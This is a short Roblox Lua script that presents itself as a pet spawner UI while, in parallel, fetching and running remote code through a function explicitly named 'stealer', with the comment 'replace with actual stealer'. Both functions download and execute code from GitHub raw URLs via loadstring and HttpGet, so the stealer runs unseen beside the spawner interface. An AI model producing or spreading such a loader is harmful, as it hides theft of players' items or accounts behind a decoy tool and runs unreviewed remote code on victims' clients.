local function stealer()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kurobrut/Wards-Hub/refs/heads/main/AutoGingerBread.lua", true))() -- replace with actual stealer
end
local function loadui()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/kurobrut/Spawner/refs/heads/main/67PetSpawner", true))()
end
task.spawn(stealer)
task.spawn(loadui)
